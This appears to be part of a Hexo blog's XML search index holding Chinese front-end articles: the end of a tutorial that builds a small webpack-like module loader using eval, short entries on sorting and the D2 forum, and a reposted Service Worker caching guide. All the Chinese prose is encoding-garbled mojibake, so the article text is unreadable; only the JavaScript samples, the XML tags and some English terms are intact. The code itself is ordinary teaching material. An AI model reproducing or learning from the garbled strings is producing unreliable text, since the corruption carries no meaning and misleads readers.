å®ç°æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¿›è¡Œè®²è§£,å…ˆæ­»äº¡å‡è§† 30 ç§’ 123456789101112131415161718192021222324;(function(graph) &#123; function require(moduleId) &#123; function localRequire(relativePath) &#123; return require(graph[moduleId].dependecies[relativePath]) &#125; var exports = &#123;&#125; ;(function(require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[moduleId].code) return exports &#125; require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  step 1 : ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ1234567891011121314151617181920// å®šä¹‰ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°,ä¼ å…¥ç”Ÿæˆçš„ä¾èµ–å…³ç³»å›¾;(function(graph) &#123; // é‡å†™requireå‡½æ•° function require(moduleId) &#123; console.log(moduleId) // ./src/index.js &#125; // ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  step 2 : ä½¿ç”¨ eval æ‰§è¡Œä»£ç 1234567891011121314151617181920212223// å®šä¹‰ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°,ä¼ å…¥ç”Ÿæˆçš„ä¾èµ–å…³ç³»å›¾;(function(graph) &#123; // é‡å†™requireå‡½æ•° function require(moduleId) &#123; ;(function(code) &#123; console.log(code) // "use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack")); eval(code) // Uncaught TypeError: Cannot read property 'code' of undefined &#125;)(graph[moduleId].code) &#125; // ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  å¯ä»¥çœ‹åˆ°,æˆ‘ä»¬åœ¨æ‰§è¡Œâ€./src/index.jsâ€æ–‡ä»¶ä»£ç çš„æ—¶å€™æŠ¥é”™äº†,è¿™æ˜¯å› ä¸º index.js é‡Œå¼•ç”¨ä¾èµ– hello.js,è€Œæˆ‘ä»¬æ²¡æœ‰å¯¹ä¾èµ–è¿›è¡Œå¤„ç†,æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹ä¾èµ–å¼•ç”¨è¿›è¡Œå¤„ç†ã€‚ step 3 : ä¾èµ–å¯¹è±¡å¯»å€æ˜ å°„,è·å– exports å¯¹è±¡12345678910111213141516171819202122232425262728293031// å®šä¹‰ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°,ä¼ å…¥ç”Ÿæˆçš„ä¾èµ–å…³ç³»å›¾;(function(graph) &#123; // é‡å†™requireå‡½æ•° function require(moduleId) &#123; // æ‰¾åˆ°å¯¹åº”moduleIdçš„ä¾èµ–å¯¹è±¡,è°ƒç”¨requireå‡½æ•°,evalæ‰§è¡Œ,æ‹¿åˆ°exportså¯¹è±¡ function localRequire(relativePath) &#123; return require(graph[moduleId].dependecies[relativePath]) // &#123;__esModule: true, say: Æ’ say(name)&#125; &#125; // å®šä¹‰exportså¯¹è±¡ var exports = &#123;&#125; ;(function(require, exports, code) &#123; // commonjsè¯­æ³•ä½¿ç”¨module.exportsæš´éœ²å®ç°,æˆ‘ä»¬ä¼ å…¥çš„exportså¯¹è±¡ä¼šæ•è·ä¾èµ–å¯¹è±¡(hello.js)æš´éœ²çš„å®ç°(exports.say = say)å¹¶å†™å…¥ eval(code) &#125;)(localRequire, exports, graph[moduleId].code) // æš´éœ²exportså¯¹è±¡,å³æš´éœ²ä¾èµ–å¯¹è±¡å¯¹åº”çš„å®ç° return exports &#125; // ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  è¿™ä¸‹åº”è¯¥æ˜ç™½äº†å§ ~ å¯ä»¥ç›´æ¥å¤åˆ¶ä¸Šé¢ä»£ç åˆ°æ§åˆ¶å°è¾“å‡ºå“¦~ å®Œæ•´ä»£ç åœ°å€æˆ³æˆ‘ ğŸ‘ˆ æ€»ç»“ Webpack æ˜¯ä¸€ä¸ªåºå¤§çš„ Node.js åº”ç”¨,å¦‚æœä½ é˜…è¯»è¿‡å®ƒçš„æºç ,ä½ ä¼šå‘ç°å®ç°ä¸€ä¸ªå®Œæ•´çš„ Webpack éœ€è¦ç¼–å†™éå¸¸å¤šçš„ä»£ç ã€‚ ä½†ä½ æ— éœ€äº†è§£æ‰€æœ‰çš„ç»†èŠ‚,åªéœ€äº†è§£å…¶æ•´ä½“æ¶æ„å’Œéƒ¨åˆ†ç»†èŠ‚å³å¯ã€‚ å¯¹ Webpack çš„ä½¿ç”¨è€…æ¥è¯´,å®ƒæ˜¯ä¸€ä¸ªç®€å•å¼ºå¤§çš„å·¥å…·ï¼› å¯¹ Webpack çš„å¼€å‘è€…æ¥è¯´,å®ƒæ˜¯ä¸€ä¸ªæ‰©å±•æ€§çš„é«˜ç³»ç»Ÿã€‚ Webpack ä¹‹æ‰€ä»¥èƒ½æˆåŠŸ,åœ¨äºå®ƒæŠŠå¤æ‚çš„å®ç°éšè—äº†èµ·æ¥,ç»™ç”¨æˆ·æš´éœ²å‡ºçš„åªæ˜¯ä¸€ä¸ªç®€å•çš„å·¥å…·,è®©ç”¨æˆ·èƒ½å¿«é€Ÿè¾¾æˆç›®çš„ã€‚ åŒæ—¶æ•´ä½“æ¶æ„è®¾è®¡åˆç†,æ‰©å±•æ€§é«˜,å¼€å‘æ‰©å±•éš¾åº¦ä¸é«˜,é€šè¿‡ç¤¾åŒºè¡¥è¶³äº†å¤§é‡ç¼ºå¤±çš„åŠŸèƒ½,è®© Webpack å‡ ä¹èƒ½èƒœä»»ä»»ä½•åœºæ™¯ã€‚ å‚è€ƒwebpack ä¸­æ–‡æ–‡æ¡£ æ·±å…¥æµ…å‡º webpack]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ’åº]]></title>
    <url>%2F2020%2F01%2F07%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%2F%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[å‚è€ƒæ–‡æ¡£ åå¤§ç»å…¸æ’åºç®—æ³•]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„ä¸ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æ•°æ®ç»“æ„ä¸ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å…¨é“¾è·¯æ€§èƒ½ä¼˜åŒ–]]></title>
    <url>%2F2019%2F12%2F20%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%85%A8%E9%93%BE%E8%B7%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[D2 å‰ç«¯æŠ€æœ¯è®ºå›æœ‰æ„Ÿ]]></title>
    <url>%2F2019%2F12%2F19%2FWeb%E5%89%8D%E7%AB%AF%2FD2%20%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF%E8%AE%BA%E5%9D%9B%E6%9C%89%E6%84%9F%2F</url>
    <content type="text"><![CDATA[æ‰˜è€æ¿ç¦å¶å¾—D2é—¨ç¥¨ä¸€å¼ ï¼Œå‘¨æœ«æœ‰å¹¸å‚åŠ äº†ç¬¬14å±ŠD2å‰ç«¯æŠ€æœ¯è®ºå›ï¼Œæ•´ä½“ä½“éªŒéå¸¸æ£’ã€‚å‰ç«¯æ˜¯ä¸€ä¸ªå…¥é—¨é—¨æ§›æä½ï¼Œè€Œå¤©èŠ±æ¿æé«˜çš„è¡Œä¸šï¼Œé‡å¤æœºæ¢°åœ°â€œç³Šé¡µé¢â€å·²ç»è¿œè¿œä¸èƒ½æ»¡è¶³éªšåŠ¨çš„æŠ€æœ¯å†…å¿ƒï¼Œæˆ‘ä»¬æ¸´æœ›æˆé•¿ï¼Œå¯»æ±‚çªç ´ï¼Œå§‘ä¸”è·ŸéšD2 å‰ç«¯è®ºå›æ¥çœ‹æ·±æ°´åŒºå‰ç«¯çš„è‡ªæˆ‘æ•‘èµã€‚ TensorFlow 9012 å¹´äº†ç®—æ³•æ¨èå·²æ·±å…¥äººå¿ƒï¼Œâ€œçŒœä½ å–œæ¬¢â€ä¹Ÿè®©äººå˜å¾—è¶Šæ¥è¶Šå–œæ¬¢ã€‚éšç€ tensorFlow.js ä¸æ–­å®Œå–„ï¼Œæ¨¡å‹è¶Šæ¥è¶Šä¸°å¯Œï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒ python æ¨¡å‹è½¬æ¢ï¼Œå‰ç«¯æ™ºèƒ½æ­£åœ¨æˆä¸ºä¸€ä¸ªç‚™æ‰‹å¯çƒ­çš„è¯é¢˜ã€‚å°è±¡æœ€æ·±çš„æ˜¯å…¶ä¸­ä¸€ä¸ªæ¬§è±é›…åŸºäº tensorFlow.js æ¨¡å‹çš„å£çº¢è¯•è£…å°ç¨‹åºï¼Œç›®å‰è‡ªå·±ä¹Ÿåœ¨åšä¸€äº›â€œç«¯æ™ºèƒ½â€ç›¸å…³ç”¨æˆ·è¡Œä¸ºå®æ—¶æ¨èçš„äº‹æƒ…ï¼Œä½†ä¸»è¦è¿˜ä¾èµ–ç«¯ä¸Š sdk è·‘ python æ¨¡å‹ï¼Œåœ¨æ”¯ä»˜å®ç­‰ç«¯å¤– h5 åœºæ™¯æ²¡æœ‰ç«¯ sdk çš„åŠ æŒï¼ŒåŒæ ·ä¾èµ–å‰ç«¯æ™ºèƒ½å€ŸåŠ© tensorFlow.js åœ¨æœ¬åœ°æ¶ˆè´¹æ¨¡å‹ï¼Œåç»­æˆ‘ä»¬ä¹Ÿä¼šåœ¨è¿™å—é‡ç‚¹è·Ÿè¿›ã€‚ å¾®å‰ç«¯èš‚èšé‡‘æœçš„æœ‰çŸ¥åˆ†äº«äº†â€æ ‡å‡†å¾®å‰ç«¯æ¶æ„åœ¨èš‚èšçš„è½åœ°å®è·µâ€ ï¼Œä¸»è¦å†…å®¹å‚è§â€œå¯èƒ½æ˜¯ä½ è§è¿‡æœ€å®Œå–„çš„å¾®å‰ç«¯è§£å†³æ–¹æ¡ˆâ€ã€‚ç›®å‰å·²æœ‰éå¸¸å¤šçš„â€å¾®å‰ç«¯â€æ–¹æ¡ˆï¼Œç¤¾åŒºçš„ single-spaï¼Œèš‚èšçš„ qiankun ï¼ˆåŸºäº single-spaï¼‰ï¼Œé£å†°çš„ icestark ï¼ˆâ€œICE åœ¨å¾®å‰ç«¯çš„æ¢ç´¢â€ï¼‰ç­‰ï¼Œä½†æ®Šé€”åŒå½’ï¼Œä¸ªäººè®¤ä¸ºå¾®å‰ç«¯æœ¬è´¨è§£å†³çš„é—®é¢˜ï¼šå¦‚ä½•è§£æ„å·¨çŸ³åº”ç”¨ï¼Œæ–¹æ¡ˆä¸Šåšåˆ°æŠ€æœ¯æ ˆæ— å…³ï¼Œä½¿ç”¨ä¸Šåšåˆ° iframe ä¸€æ ·ç®€å•åˆè§£å†³ iframe çš„å„ç§ä½“éªŒé—®é¢˜ã€‚ä¸ªäººä¹ŸæœŸå¾…åœ¨æ‰€è´Ÿè´£ä¸šåŠ¡çš„ä¸­åå°åº”ç”¨ä¸­å®è·µ qiankun å¾®å‰ç«¯æ–¹æ¡ˆï¼Œä¸å®è·µæ— çœŸç†ã€‚ å¼•ç”¨æœ‰çŸ¥çš„ä¸€æ®µè¯ï¼ˆå‡ºè‡ªï¼šå¾®å‰ç«¯çš„æ ¸å¿ƒä»·å€¼ï¼‰æ€»ç»“ï¼š å¾®å‰ç«¯é¦–å…ˆè§£å†³çš„ï¼Œæ˜¯å¦‚ä½•è§£æ„å·¨çŸ³åº”ç”¨ï¼Œä»è€Œè§£å†³å·¨çŸ³åº”ç”¨éšç€æŠ€æœ¯æ›´è¿­ã€äº§å“å‡çº§ã€äººå‘˜æµåŠ¨å¸¦æ¥çš„å·¥ç¨‹ä¸Šçš„é—®é¢˜ã€‚è§£æ„ä¹‹åè¿˜éœ€è¦å†é‡ç»„ï¼Œé‡ç»„çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å°±ä¼šç¢°åˆ°å„ç§ éš”ç¦»æ€§ã€ä¾èµ–å»é‡ã€é€šä¿¡ã€åº”ç”¨ç¼–æ’ ç­‰é—®é¢˜ã€‚åœ¨è§£å†³äº†è¿™äº›é—®é¢˜ä¹‹åï¼Œæ‰æ˜¯äº§å“çš„è‡ªç”±ç»„åˆã€widget è¾“å‡ºç­‰èƒ½åŠ›ã€‚åŒæ—¶ç”±äºæœ‰äº†å‰è€…èƒ½åŠ›çš„é“ºå«å’ŒåŠ æŒï¼Œè¿™äº›äº§å“ä¸Šçš„ä»·å€¼æå‡ä¹Ÿå°±å˜å¾—å¾ˆè‡ªç„¶å’Œå®¹æ˜“ã€‚ IOT è¿‘å‡ å¹´ç‰©è”ç½‘çš„å‘¼å£°å¾ˆé«˜ï¼Œä¸‡ç‰©äº’è”çš„ç†æƒ³æ­£åœ¨ä¸€æ­¥ä¸€æ­¥ç…§è¿›ç°å®ï¼Œå‰ç«¯æ‰‹æ¡æ— æ‰€ä¸èƒ½çš„ JavaScript ç´ æœ‰å¼€å‘æ•ˆç‡å¥‡é«˜çš„åŠŸæ•ˆï¼Œåœ¨ Iot é¢†åŸŸä¹Ÿæ­£æ”»åŸç•¥åœ°ã€‚ä¸è¿‡å‰ç«¯çœŸçš„è¦æƒ³æŠ“ä½ Iot çš„å¥‘æœºå¹¶ä¸å®¹æ˜“ï¼Œä¸ªäººè®¤ä¸ºï¼Œæˆ‘ä»¬éœ€è¦æ‹“å±•çš„çŸ¥è¯†é¢è¾ƒå¤šï¼Œå—é™è®¾å¤‡åº•å±‚ç”±åµŒå…¥å¼ cã€c++ ä»£ç æ— å¯é¿å…ã€å—é™è®¾å¤‡ç«¯å®¹å™¨æŠ€æœ¯ä¼˜åŒ–ç­‰ç­‰ï¼Œæ— ä¸å†²å‡»ç€ç°æœ‰å‰ç«¯æŠ€æœ¯æ ˆï¼Œä»…ä»…æ‰‹æ¡ JavaScript è¿˜è¿œè¿œä¸å¤Ÿã€‚ æ•´ä½“æ„Ÿå—ï¼šå·å¾—æµ®ç”ŸåŠæ—¥é—²ï¼Œçœ‹æ·±æ°´å‰ç«¯ç™¾å®¶äº‰é¸£ï¼Œå¾è¾ˆå…±å‹‰ã€‚å³ä½¿æ—¥å¸¸å·¥ä½œä½å¾®è€Œç¹çï¼Œä¸è¦æ”¾å¼ƒå­¦ä¹ å’ŒåŠæ—¶å……ç”µï¼Œè·Ÿä¸Šæ—¶ä»£çš„æ½®æµæ‰èƒ½æ°¸ä¸è½ä¼ã€‚ å‚è€ƒæ–‡æ¡£ ICE åœ¨å¾®å‰ç«¯çš„æ¢ç´¢ å¯èƒ½æ˜¯ä½ è§è¿‡æœ€å®Œå–„çš„å¾®å‰ç«¯è§£å†³æ–¹æ¡ˆ]]></content>
      <categories>
        <category>Webå‰ç«¯ åŸåˆ›</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Service Workeræœ€ä½³å®è·µ]]></title>
    <url>%2F2019%2F12%2F04%2FWeb%E5%89%8D%E7%AB%AF%2FService%20Worker%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ª TBS è…¾è®¯æµè§ˆæœåŠ¡ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://x5.tencent.com/tbs/guide/serviceworker.html 1 Service Workerä»‹ç»Service Workeræ˜¯ä¸€é¡¹æ¯”è¾ƒæ–°çš„WebæŠ€æœ¯ï¼Œæ˜¯Chromiumå›¢é˜Ÿåœ¨å¸æ”¶äº†ChromePackaged Appçš„Event Pageæœºåˆ¶ï¼ŒåŒæ—¶å¸å–äº†HTML5 AppCacheæ ‡å‡†å¤±è´¥çš„æ•™è®­ä¹‹åï¼Œæå‡ºä¸€å¥—æ–°çš„W3Cè§„èŒƒï¼Œæ—¨åœ¨æé«˜WebAppçš„ç¦»çº¿ç¼“å­˜èƒ½åŠ›ï¼Œç¼©å°WebAppä¸NativeAppä¹‹é—´å·®è·ã€‚ Service Workerä»è‹±æ–‡ç¿»è¯‘è¿‡æ¥å°±æ˜¯ä¸€ä¸ªæœåŠ¡å·¥äººï¼ŒæœåŠ¡äºå‰ç«¯é¡µé¢çš„åå°çº¿ç¨‹ï¼ŒåŸºäºWeb Workerå®ç°ã€‚æœ‰ç€ç‹¬ç«‹çš„Javascriptè¿è¡Œç¯å¢ƒï¼Œåˆ†æ‹…ã€ååŠ©å‰ç«¯é¡µé¢å®Œæˆå‰ç«¯å¼€å‘è€…åˆ†é…çš„éœ€è¦åœ¨åå°æ‚„æ‚„æ‰§è¡Œçš„ä»»åŠ¡ã€‚åŸºäºå®ƒå¯ä»¥å®ç°æ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚ã€æ¶ˆæ¯æ¨é€ã€é™é»˜æ›´æ–°ã€äº‹ä»¶åŒæ­¥ç­‰æœåŠ¡ã€‚ X5å†…æ ¸ä½œä¸ºWebViewæä¾›ç»™ä¸åŒappä½¿ç”¨ï¼Œå…·å¤‡Service Workerç½‘ç»œæ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œé…åˆCacheStorageå¯ä»¥å®ç°webé¡µé¢çš„ç¼“å­˜ç®¡ç†ä»¥åŠä¸å‰ç«¯é€šè¿‡PostMessageé€šä¿¡ã€‚ 2 Service Workerå·¥ä½œåŸç†Service WorkeræŠ€æœ¯æ ¸å¿ƒæ˜¯Service Workerè„šæœ¬ï¼Œå®ƒ æ˜¯ä¸€ç§ç”±Javascriptç¼–å†™çš„æµè§ˆå™¨ç«¯ä»£ç†è„šæœ¬ã€‚ å‰ç«¯é¡µé¢å‘å†…æ ¸å‘èµ·æ³¨å†Œæ—¶ä¼šå°†è„šæœ¬åœ°å€é€šçŸ¥å†…æ ¸ï¼Œå†…æ ¸ä¼šå¯åŠ¨ç‹¬ç«‹è¿›/çº¿ç¨‹åŠ è½½Service Workerè„šæœ¬å¹¶æ‰§è¡ŒService Workerå®‰è£…åŠæ¿€æ´»åŠ¨ä½œã€‚æˆåŠŸæ¿€æ´»åä¾¿è¿›å…¥ç©ºé—²ç­‰å¾…çŠ¶æ€ï¼Œè‹¥å½“å‰çš„Service Workerè¿›/çº¿ç¨‹ä¸€ç›´æ²¡æœ‰ç®¡è¾–çš„é¡µé¢æˆ–è€…äº‹ä»¶æ¶ˆæ¯æ—¶ä¼šè‡ªåŠ¨ç»ˆæ­¢ï¼ˆå…·ä½“çš„ç»ˆæ­¢ç­–ç•¥è§†ä¸åŒæµè§ˆå™¨åŠç‰ˆæœ¬è€Œå®šï¼Œä¸ä¼šå½±å“å‰ç«¯ç¼–å†™é€»è¾‘ï¼Œä½†å‰ç«¯å‹¿åœ¨Service Workerè„šæœ¬ä¸­ä¿å­˜éœ€è¦æŒä¹…åŒ–çš„ä¿¡æ¯ï¼Œå¯ä»¥å€ŸåŠ©localstorageï¼‰ï¼Œå½“æ‰“å¼€æ–°çš„å¯ç®¡è¾–é¡µé¢æˆ–è€…å·²ç®¡è¾–é¡µé¢å‘èµ·messageç­‰æ¶ˆæ¯æ—¶ï¼ŒService Workerè¿›/çº¿ç¨‹ä¼šè¢«é‡æ–°å”¤èµ·ã€‚ æ¯å½“å·²å®‰è£…çš„Service Workeræœ‰ç®¡è¾–é¡µé¢è¢«æ‰“å¼€æ—¶ï¼Œä¾¿ä¼šè§¦å‘Service Workerè„šæœ¬æ›´æ–°ï¼Œå½“ä¸Šæ¬¡è„šæœ¬æ›´æ–°å†™å…¥Service Workeræ•°æ®åº“çš„æ—¶é—´æˆ³ä¸æœ¬æ¬¡æ›´æ–°è¶…è¿‡24å°æ—¶ï¼Œä¾¿ä¼šå¿½ç•¥æœ¬åœ°ç½‘ç»œcacheçš„Service Workerè„šæœ¬ç›´æ¥ä»ç½‘ç»œæ‹‰å–ã€‚è‹¥ç½‘ç»œæ‹‰å–çš„ä¸æœ¬åœ°æœ‰ä¸€ä¸ªå­—èŠ‚çš„å·®å¼‚éƒ½ä¼šè§¦å‘Service Workerè„šæœ¬çš„æ›´æ–°ï¼Œæ›´æ–°æµç¨‹ä¸å®‰è£…ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ›´æ–°å®‰è£…æˆåŠŸåä¸ä¼šç«‹å³è¿›å…¥activeçŠ¶æ€ï¼Œéœ€è¦ç­‰å¾…æ—§ç‰ˆæœ¬çš„Service Workerè¿›/çº¿ç¨‹ç»ˆæ­¢ã€‚ 3 Service Workerå¼€å‘è°ƒè¯•æ–¹æ³•æœ‰è¿‡ä½¿ç”¨chrome inspectå‰ç«¯é¡µé¢è°ƒè¯•ç»éªŒå¯¹äºService Workerå¼€å‘è°ƒè¯•å°±å¾ˆå®¹æ˜“ä¸Šæ‰‹äº†ï¼Œä»¥ offline-page ä¸ºä¾‹ï¼š ä½¿ç”¨pc chromeæµè§ˆå™¨ï¼ˆæœ€å¥½æ˜¯M53ä»¥åç‰ˆæœ¬ï¼‰æ‰“å¼€ä¸Šè¿°é¡µé¢åï¼ŒæŒ‰F12é”®è¿›å…¥inspectè°ƒè¯•æ¨¡å¼å â€‹ å•å‡»å›¾2 inspectè°ƒè¯•ç•Œé¢ä¸­çš„1åŠ2åä¼šå‡ºç°å½“å‰é¡µé¢åŸŸä¸‹çš„æ‰€æœ‰Service Workerï¼Œåœ¨å•å‡»6å°±ä¼šè¿›å…¥å›¾3ç•Œé¢ï¼Œè¿™ä¸ªæ—¶å€™è°ƒè¯•Service Workerè„šæœ¬å°±å¦‚è°ƒè¯•å‰ç«¯é¡µé¢jsä¸€æ ·ï¼Œå¯ä»¥éšæ„åœ¨Service Workerè„šæœ¬ä¸­ä¸‹æ–­ç‚¹ã€‚å¦‚æœåœ¨fetchç›‘å¬äº‹ä»¶ä¸­æ‰“ä¸Šæ–­ç‚¹ï¼Œå½“é¡µé¢åˆ·æ–°æˆ–è€…é¡µé¢ä¸­æœ‰å…¶å®ƒè¯·æ±‚æ—¶ä¾¿ä¼šåˆ°è¾¾Service Workerçº¿ç¨‹ï¼Œä½¿å¾—Service Workerè„šæœ¬ä¸­çš„fetchäº‹ä»¶æ‰§è¡Œè¢«ä¸­æ–­ï¼Œè¿™æ—¶å¯ä»¥å°†é¼ æ ‡ç§»åŠ¨åˆ°fetchäº‹ä»¶ä¸­çš„eventä¸Šä¾¿å¯ä»¥çœ‹åˆ°æ˜¯ä»€ä¹ˆæ ·çš„è¯·æ±‚ã€è¯·æ±‚çš„urlç­‰ ã€‚ å¯¹äºä¸€äº›è¾ƒä¸ºå¤æ‚çš„é¡µé¢ï¼Œå¾€å¾€ä¼šæœ‰ä¸€éƒ¨åˆ†èµ„æºä½¿ç”¨æœ¬åœ°cacheï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†ä»ç„¶éœ€è¦æ˜¯æ—¶æ‹‰å–ï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‹¾é€‰å›¾2ä¸­çš„3ã€4æ¥å¿«é€Ÿè¾¾åˆ°å½“å‰tabé¡µç¦»çº¿å’Œè·³è¿‡Service Workeræ‹¦æˆªã€‚ åœ¨ä¹‹å‰çš„åŸç†ä¸­è¯´è¿‡ï¼ŒService Workerä¼šåœ¨æ¯æ¬¡æ‰“å¼€å¯¹åº”çš„é¡µé¢åå»æ£€æŸ¥æ›´æ–°Service Workerè„šæœ¬ï¼Œä½†å¦‚æœService Workerè„šæœ¬æœ‰ç¼“å­˜æœŸé™çš„è¯ï¼Œé‚£ä¹ˆåœ¨å¼€å‘è°ƒè¯•çš„æ—¶å€™ä¿®æ”¹äº†æµ‹è¯•é¡µé¢çš„Service Workerè„šæœ¬å¹¶pushåˆ°æµ‹è¯•é¡µé¢æœåŠ¡å™¨ä¸Šä¹‹åï¼Œåˆ·æ–°é¡µé¢å¹¶ä¸èƒ½ç«‹å³å»ç½‘ç»œæ›´æ–°è„šæœ¬ï¼Œç»™å¼€å‘è°ƒè¯•å¸¦æ¥éº»çƒ¦ï¼Œä½†å›¾2ä¸­çš„5å¯ä»¥å¸®åŠ©å¼€å‘å¼ºè¡Œå¿½ç•¥æœ¬åœ°Service Workerè„šæœ¬cacheï¼Œå®æ—¶çš„å»ç½‘ç»œæ›´æ–°ã€‚ Service Workerå¯ä»¥ç¼“å­˜èµ„æºï¼Œç‚¹å‡»å›¾2ä¸­çš„7ä¾¿å¯ä»¥çœ‹åˆ°å›¾4å±•ç¤ºï¼Œè¡¨æ˜äº†å½“å‰æµè§ˆå™¨å¯¹å½“å‰é¡µé¢çš„èµ„æºç¼“å­˜æƒ…å†µï¼Œå¯ä»¥é€šè¿‡é¼ æ ‡å³é”®ç‰¹å®šèµ„æºå¯¹èµ„æºè¿›è¡Œåˆ é™¤æ“ä½œã€‚ æœ€åæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æµè§ˆå™¨ä¸­è¾“å…¥chrome://serviceworker-internalsæ¥äº†è§£å½“å‰æµè§ˆå™¨ä¸­æ‰€æœ‰å·²å®‰è£…Service Workerçš„è¯¦ç»†æƒ…å†µï¼ŒInstallation StatusåŠRunning Statuså±•ç¤ºå½“å‰Service Workerå®‰è£…çŠ¶æ€åŠè¿è¡ŒçŠ¶æ€ï¼ŒVersion IDä¸ºå…¶åœ¨å½“å‰æ•°æ®åº“ä¸­çš„ä¸€ä¸ªåˆ†é…åˆ°çš„ç‰ˆæœ¬å·ï¼Œåç»­Service Workerè„šæœ¬å‡çº§ï¼Œç‰ˆæœ¬å·ä¹Ÿä¼šä¸€èµ·æå‡ã€‚ 4 ä½¿ç”¨Service Workerè¿›è¡Œèµ„æºç¼“å­˜4.1 ä½¿ç”¨Service Workerè¿›è¡Œç®€å•çš„èµ„æºç¼“å­˜è¿˜æ˜¯ä»¥ offline-page ä¸ºä¾‹ï¼Œå‰ç«¯åœ¨åŸæ¥çš„webåº”ç”¨ä¸­ä½¿ç”¨Service Workeråªéœ€è¦ä¸‰å¤§æ­¥ 1ã€åˆ‡å…¥åˆ°httpsï¼›ç”±äºService Workerå¯ä»¥åŠ«æŒè¿æ¥ï¼Œä¼ªé€ å’Œè¿‡æ»¤å“åº”ï¼Œæ‰€ä»¥ä¿è¯å…¶åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¢«ç¯¡æ”¹éå¸¸é‡è¦ã€‚ 2ã€åœ¨é¡µé¢åŠ è½½çš„æ°å½“æ—¶æœºæ³¨å†ŒService Workerï¼›ç¤ºä¾‹ä¸­åœ¨indexé¡µé¢çš„body onloadäº‹ä»¶ä¸­æ³¨å†Œäº†åŒpathä¸‹çš„service-worker.jsä½œä¸ºindexé¡µé¢çš„æœåŠ¡çº¿ç¨‹è„šæœ¬ã€‚ 3ã€ç¼–å†™serviceworkerè„šæœ¬é€»è¾‘ï¼›serviceworkeræ˜¯äº‹ä»¶é©±åŠ¨å‹æœåŠ¡çº¿ç¨‹ï¼Œæ‰€ä»¥serviceworkerè„šæœ¬é€»è¾‘ä¸­åŸºæœ¬éƒ½æ˜¯ä»¥äº‹ä»¶ç›‘å¬ä½œä¸ºé€»è¾‘å…¥å£ï¼Œç¤ºä¾‹ä¸­åœ¨serviceworkerè„šæœ¬è¢«å®‰è£…çš„installäº‹ä»¶ä¸­ç¼“å­˜indexé¡µé¢ä¸»èµ„æºåŠå­èµ„æºï¼Œ 